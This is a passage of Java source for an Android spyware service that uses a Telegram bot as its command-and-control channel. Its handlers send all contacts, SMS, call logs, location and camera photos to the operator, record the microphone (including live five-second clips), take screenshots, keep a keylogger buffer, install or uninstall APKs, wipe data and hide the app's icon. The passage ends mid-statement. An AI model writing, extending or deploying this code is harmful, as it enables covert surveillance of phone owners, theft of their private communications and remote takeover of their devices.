package com.telec2.client;

import android.app.*;
import android.content.*;
import android.content.pm.PackageInstaller;
import android.hardware.*;
import android.hardware.camera2.*;
import android.location.*;
import android.media.*;
import android.net.*;
import android.os.*;
import android.provider.*;
import android.provider.Settings;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class TelegramC2Service extends Service {
    
    private static final String BOT_TOKEN = Config.BOT_TOKEN;
    private static final String CHAT_ID = Config.CHAT_ID;
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    
    private ScheduledExecutorService scheduler;
    private int lastUpdateId = 0;
    private boolean isListening = false;
    
    // Vibrator
    private Vibrator vibrator;
    
    // Torch
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isTorchOn = false;
    
    // Audio Recording
    private boolean isRecordingAudio = false;
    private boolean isLiveAudio = false;
    private ScheduledFuture<?> liveAudioTask;
    
    // Screen Stream
    private boolean isStreaming = false;
    private ScheduledFuture<?> streamTask;
    
    // Keylogger
    private StringBuilder keylogBuffer = new StringBuilder();
    private boolean keylogActive = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        scheduler = Executors.newScheduledThreadPool(5);
        
        // Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            VibratorManager vm = (VibratorManager) getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
            vibrator = vm.getDefaultVibrator();
        } else {
            vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        }
        
        // Camera for Torch
        try {
            cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Boolean flash = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (flash != null && flash) { cameraId = id; break; }
            }
        } catch (Exception e) { }
        
        startForeground(1001, createNotification());
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isListening) {
            isListening = true;
            scheduler.scheduleWithFixedDelay(this::checkCommands, 3, 2, TimeUnit.SECONDS);
        }
        return START_STICKY;
    }
    
    // ================== COMMAND CHECKER ==================
    
    private void checkCommands() {
        try {
            String url = API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
            String response = httpGet(url);
            JSONObject json = new JSONObject(response);
            JSONArray results = json.getJSONArray("result");
            
            for (int i = 0; i < results.length(); i++) {
                JSONObject update = results.getJSONObject(i);
                lastUpdateId = update.getInt("update_id");
                JSONObject msg = update.getJSONObject("message");
                String text = msg.optString("text", "");
                long chatId = msg.getLong("chat");
                
                if (String.valueOf(chatId).equals(CHAT_ID)) {
                    processCommand(text);
                }
            }
        } catch (Exception e) { }
    }
    
    private void processCommand(String cmd) {
        String[] parts = cmd.split(" ", 2);
        String command = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";
        
        switch (command) {
            // HELP
            case "/help": case "/start": sendMsg(getHelpText()); break;
            
            // DEVICE
            case "/info": sendMsg(getDeviceInfo()); break;
            case "/location": sendMsg(getLocation()); break;
            
            // DATA (NO LIMIT)
            case "/contacts": sendAllContacts(); break;
            case "/sms": sendAllSMS(); break;
            case "/calllog": sendAllCallLog(); break;
            
            // CAMERA
            case "/camera_front": capturePhoto(1); break;
            case "/camera_back": capturePhoto(0); break;
            case "/screenshot": takeScreenshot(); break;
            
            // TORCH
            case "/torch_on": torchOn(); break;
            case "/torch_off": torchOff(); break;
            case "/torch": if (isTorchOn) torchOff(); else torchOn(); break;
            case "/flash": doFlash(args); break;
            
            // VIBRATION
            case "/vibrate": doVibrate(args); break;
            case "/vibrate_pattern": doVibratePattern(args); break;
            case "/vibrate_stop": if (vibrator != null) vibrator.cancel(); sendMsg("✅ Stopped"); break;
            
            // AUDIO RECORD (One-tap: 1 minute default)
            case "/record": startAudioRecord("60"); break;
            case "/record_10": startAudioRecord("10"); break;
            case "/record_30": startAudioRecord("30"); break;
            case "/record_60": startAudioRecord("60"); break;
            case "/record_120": startAudioRecord("120"); break;
            case "/stop_audio": stopAudioRecord(); break;
            
            // LIVE AUDIO
            case "/live_start": startLiveAudio(); break;
            case "/live_stop": stopLiveAudio(); break;
            
            // VOLUME
            case "/volume": setVolume(args); break;
            case "/volume_up": volumeUp(); break;
            case "/volume_down": volumeDown(); break;
            
            // RINGER MODE
            case "/silent": setRingerMode(AudioManager.RINGER_MODE_SILENT); break;
            case "/vibrate_mode": setRingerMode(AudioManager.RINGER_MODE_VIBRATE); break;
            case "/normal_mode": setRingerMode(AudioManager.RINGER_MODE_NORMAL); break;
            
            // BRIGHTNESS
            case "/brightness": setBrightness(args); break;
            case "/max_brightness": setBrightness("255"); break;
            case "/min_brightness": setBrightness("1"); break;
            
            // DND
            case "/dnd_on": setDnd(true); break;
            case "/dnd_off": setDnd(false); break;
            
            // FILES
            case "/filelist": listFiles(args); break;
            case "/install": installApk(args); break;
            case "/uninstall": uninstallApp(args); break;
            
            // SCREEN STREAM
            case "/screen_start": startScreenStream(); break;
            case "/screen_stop": stopScreenStream(); break;
            
            // KEYLOGGER
            case "/keylog_start": keylogActive = true; keylogBuffer.setLength(0); sendMsg("⌨️ Started"); break;
            case "/keylog_stop": keylogActive = false; sendMsg("⌨️ Stopped"); break;
            case "/keylog_get": sendMsg("⌨️ **Logs**\n" + (keylogBuffer.length() > 0 ? keylogBuffer.toString() : "(empty)")); keylogBuffer.setLength(0); break;
            
            // WIPE
            case "/wipe": wipeData(); break;
            
            // ICON
            case "/hide": hideIcon(); break;
            case "/unhide": showIcon(); break;
            
            // UNINSTALL SELF
            case "/uninstall_self": uninstallSelf(); break;
        }
    }
    
    // ================== TORCH ==================
    
    private void torchOn() {
        try {
            if (cameraId == null) { sendMsg("❌ No flash"); return; }
            cameraManager.setTorchMode(cameraId, true);
            isTorchOn = true;
            sendMsg("🔦 ON");
        } catch (Exception e) { sendMsg("❌ " + e.getMessage()); }
    }
    
    private void torchOff() {
        try {
            if (cameraId == null) return;
            cameraManager.setTorchMode(cameraId, false);
            isTorchOn = false;
            sendMsg("🔦 OFF");
        } catch (Exception e) { }
    }
    
    private void doFlash(String args) {
        try {
            int count = 1;
            if (!args.isEmpty()) { count = Integer.parseInt(args); if (count > 50) count = 50; }
            final int c = count;
            sendMsg("⚡ " + c + " times");
            new Thread(() -> {
                try {
                    for (int i = 0; i < c; i++) {
                        cameraManager.setTorchMode(cameraId, true);
                        Thread.sleep(150);
                        cameraManager.setTorchMode(cameraId, false);
                        Thread.sleep(250);
                    }
                    sendMsg("✅ Done");
                } catch (Exception e) { }
            }).start();
        } catch (Exception e) { sendMsg("❌ Usage: /flash 5"); }
    }
    
    // ================== VIBRATE ==================
    
    private void doVibrate(String args) {
        try {
            if (vibrator == null || !vibrator.hasVibrator()) { sendMsg("❌ No vibrator"); return; }
            long ms = 1000;
            if (!args.isEmpty()) { ms = Long.parseLong(args) * 1000; if (ms > 60000) ms = 60000; }
            if (Build.VERSION.SDK_INT >= 26) {
                vibrator.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE));
            } else { vibrator.vibrate(ms); }
            sendMsg("📳 " + (ms/1000) + "s");
        } catch (Exception e) { sendMsg("❌ Usage: /vibrate 5"); }
    }
    
    private void doVibratePattern(String args) {
        try {
            if (vibrator == null || !vibrator.hasVibrator()) { sendMsg("❌ No vibrator"); return; }
            String[] p = args.split(",");
            long[] pattern = new long[p.length];
            for (int i = 0; i < p.length; i++) pattern[i] = Long.parseLong(p[i].trim());
            if (Build.VERSION.SDK_INT >= 26) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, -1));
            } else { vibrator.vibrate(pattern, -1); }
            sendMsg("📳 Pattern");
        } catch (Exception e) { sendMsg("❌ Usage: /vibrate_pattern 200,500,200"); }
    }
    
    // ================== CONTACTS (NO LIMIT) ==================
    
    private void sendAllContacts() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder("👥 **All Contacts**\n\n");
                Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                
                int total = cursor.getCount();
                int c = 0;
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append("▪ ").append(name).append(" → ").append(phone).append("\n");
                    c++;
                    if (c % 50 == 0) { sendMsg(sb.toString()); sb = new StringBuilder(); Thread.sleep(500); }
                }
                cursor.close();
                if (sb.length() > 0) { sb.append("\nTotal: ").append(total); sendMsg(sb.toString()); }
                sendMsg("✅ " + total + " contacts sent");
            } catch (Exception e) { sendMsg("❌ Error: " + e.getMessage()); }
        }).start();
    }
    
    // ================== SMS (NO LIMIT) ==================
    
    private void sendAllSMS() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder("📨 **All SMS**\n\n");
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                
                int total = cursor.getCount();
                int c = 0;
                while (cursor.moveToNext()) {
                    String addr = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append("From: ").append(addr).append("\n").append(body).append("\n\n---\n\n");
                    c++;
                    if (c % 10 == 0) { sendMsg(sb.toString()); sb = new StringBuilder(); Thread.sleep(500); }
                }
                cursor.close();
                if (sb.length() > 0) sendMsg(sb.toString());
                sendMsg("✅ " + total + " SMS sent");
            } catch (Exception e) { sendMsg("❌ Error"); }
        }).start();
    }
    
    // ================== CALL LOG (NO LIMIT) ==================
    
    private void sendAllCallLog() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder("📞 **Call Log**\n\n");
                Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                
                int total = cursor.getCount();
                int c = 0;
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    String num = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String dur = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    String typeStr = type.equals("1") ? "📞 In" : type.equals("2") ? "📞 Out" : "📞 Missed";
                    if (name == null) name = "Unknown";
                    sb.append(typeStr).append(" ").append(name).append(" (").append(num).append(") ").append(dur).append("s\n");
                    c++;
                    if (c % 30 == 0) { sendMsg(sb.toString()); sb = new StringBuilder(); Thread.sleep(500); }
                }
                cursor.close();
                if (sb.length() > 0) sendMsg(sb.toString());
                sendMsg("✅ " + total + " call logs sent");
            } catch (Exception e) { sendMsg("❌ Error"); }
        }).start();
    }
    
    // ================== AUDIO RECORD ==================
    
    private void startAudioRecord(String args) {
        if (isRecordingAudio) { sendMsg("❌ Already recording"); return; }
        
        int duration = 60;
        if (!args.isEmpty()) { try { duration = Integer.parseInt(args); if (duration > 300) duration = 300; } catch (Exception e) { } }
        
        final int sampleRate = 44100;
        final int bufferSize = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        final AudioRecord recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2);
        
        final int finalDuration = duration;
        isRecordingAudio = true;
        sendMsg("🔴 Recording " + duration + "s...");
        
        new Thread(() -> {
            byte[] buffer = new byte[bufferSize];
            int totalRead = 0;
            int maxBytes = sampleRate * 2 * finalDuration;
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            
            recorder.startRecording();
            try {
                while (isRecordingAudio && totalRead < maxBytes) {
                    int read = recorder.read(buffer, 0, buffer.length);
                    if (read > 0) { bos.write(buffer, 0, read); totalRead += read; }
                }
            } catch (Exception e) { }
            
            recorder.stop();
            recorder.release();
            isRecordingAudio = false;
            
            try {
                byte[] pcmData = bos.toByteArray();
                String wavPath = getCacheDir() + "/audio_" + System.currentTimeMillis() + ".wav";
                createWavFile(pcmData, pcmData.length, sampleRate, wavPath);
                sendAudioFile(wavPath);
            } catch (Exception e) { sendMsg("❌ Error saving audio"); }
        }).start();
    }
    
    private void stopAudioRecord() { isRecordingAudio = false; sendMsg("⏹ Stopped"); }
    
    // ================== LIVE AUDIO ==================
    
    private void startLiveAudio() {
        if (isLiveAudio) { sendMsg("❌ Already live"); return; }
        isLiveAudio = true;
        sendMsg("🎤 Live audio started (5s clips)");
        
        liveAudioTask = scheduler.scheduleAtFixedRate(() -> {
            if (!isLiveAudio) return;
            try {
                int sampleRate = 44100;
                int bufferSize = AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
                AudioRecord r = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2);
                
                int maxBytes = sampleRate * 2 * 5; // 5 seconds
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[bufferSize];
                int total = 0;
                
                r.startRecording();
                while (total < maxBytes) { int red = r.read(buf, 0, buf.length); if (red > 0) { bos.write(buf, 0, red); total += red; } }
                r.stop(); r.release();
                
                String path = getCacheDir() + "/live_" + System.currentTimeMillis() + ".wav";
                createWavFile(bos.toByteArray(), total, sampleRate, path);
                sendAudioFile(path);
            } catch (Exception e) { }
        }, 0, 6, TimeUnit.SECONDS);
    }
    
    private void stopLiveAudio() {
        isLiveAudio = false;
        if (liveAudioTask != null) { liveAudioTask.cancel(false); liveAudioTask = null; }
        sendMsg("⏹ Live stopped");
    }
    
    // ================== WAV CREATOR ==================
    
    private void createWavFile(byte[] pcmData, int size, int sampleRate, String path) {
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            writeStr(bos, "RIFF"); writeInt(bos, 36 + size);
            writeStr(bos, "WAVE"); writeStr(bos, "fmt ");
            writeInt(bos, 16); writeShort(bos, (short)1);
            writeShort(bos, (short)1); writeInt(bos, sampleRate);
            writeInt(bos, sampleRate * 2); writeShort(bos, (short)2);
            writeShort(bos, (short)16); writeStr(bos, "data");
            writeInt(bos, size); bos.write(pcmData, 0, size);
            
            FileOutputStream fos = new FileOutputStream(path);
            fos.write(bos.toByteArray()); fos.close();
        } catch (Exception e) { }
    }
    
    private void writeStr(ByteArrayOutputStream b, String s) { for (char c : s.toCharArray()) b.write(c); }
    private void writeInt(ByteArrayOutputStream b, int v) { b.write(v & 0xff); b.write((v>>8) & 0xff); b.write((v>>16) & 0xff); b.write((v>>24) & 0xff); }
    private void writeShort(ByteArrayOutputStream b, short v) { b.write(v & 0xff); b.write((v>>8) & 0xff); }
    
    // ================== SEND FILE ==================
    
    private void sendAudioFile(String filePath) {
        try {
            File f = new File(filePath);
            if (!f.exists()) return;
            byte[] data = readFile(f);
            
            String boundary = "Boundary" + System.currentTimeMillis();
            URL url = new URL(API_URL + "sendDocument");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST"); c
